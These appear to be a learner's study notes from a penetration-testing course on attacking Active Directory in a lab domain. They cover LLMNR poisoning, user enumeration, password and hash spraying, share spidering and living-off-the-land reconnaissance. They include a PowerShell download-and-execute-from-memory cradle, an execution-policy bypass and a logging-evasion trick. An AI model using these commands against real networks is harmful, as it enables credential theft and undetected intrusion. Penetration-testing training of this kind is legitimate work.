# Active directory (my favorite ironically :p)
The first chapter covered enumerating just like I did previously 


## LLMNR NBT-NS

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests.

We will use first responder and let it run for a while in the system to capture hashes and crack them with hashcat with m 5600 for NTLMv2

with windows we'll be using the script inveigh.ps


 to start, we import the module

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>
```
and to start the module as follows:

```PS
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## Password spraying
if we have an SMB null session, we can use enum4linux, to have users present in the AD with this following command.
```sh
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
or with rpcclient

```sh
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
```
and finally it can be done with crackmapexec 

```sh
crackmapexec smb 172.16.5.5 --users
```
using LDAP anonymous

```sh
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
or with this tool
```sh
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

let's suppose we want to brute force users we can use custome username lists, and kerbrute, that uses TGT to validate is the user exists or not.

```sh
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 ```

 if we have a valid credentials we can use crackmapexec to validate users 

 ```sh
 sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 Suppose we found the user names, we want to try the password welcome1, those different methods to do so.

 ```bash
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

#with kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
#carckmap exec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# to validate the users

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

```

Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.

```sh
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Enumerating security protocols

using ```Get-MpComputerStatus``` allows us to to get current microsoft defender status ```RealTimeProtectionEnabled``` parameter is set to True

### AppLocker
is a white list application program that enables administrators to set a white list programs to be installed.

```ps
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Creds enumerations

Use crackmap exec, see the pdf attached to this folder

when pwning a user we can use those commands 
```sh
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json  ## to see the file
```
another handy tool to check smb is smbmap

```sh
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

```
Now that we've covered shares, let's look at RPCClient.

rpcclient, is a handy tool but gives a lot of output it frustrates me :p 

```sh
rpcclient -U "" -N 172.16.5.5 # for the null sessions
# we should see a prompt 
rpcclient $>

rpcclient $> queryuser 0x457 #RPCClient User Enumeration By RID

# if we don't have the user's RID
rpcclient $> enumdomusers  # to enumerate all RID's
```

Another handy and well used tool, is impacket

## Living off the land

Basic enumeration 
# Useful Commands for System Information

| Command | Description |
| ------- | ----------- |
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all` | Prints out network adapter state and configurations |
| `set` | Displays a list of environment variables for the current session (run from CMD prompt) |
| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (run from CMD prompt) |
| `echo %logonserver%` | Prints out the name of the Domain Controller the host checks in with (run from CMD prompt) |
| | |


We have systeminfo

```ps
Get-Module	 #Get all available module

Set-ExecutionPolicy Bypass -Scope Process #This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. 

Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 

Get-ChildItem Env: | ft Key,Value # get enviromental values

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" #This is a quick and easy way to download a file from the web using PowerShell and call it from memory.

netsh advfirewall show allprofiles # cheking firewalls 

sc query windefend # checking windows defender

qwinsta #check for logged users

netsh advfirewall show allprofiles #Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
```

to by pass powershell loggin, use powershell 2.0 or older =)

```ps
powershell.exe -version 2
```

## Windows Management Instrumentation (WMI)
https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4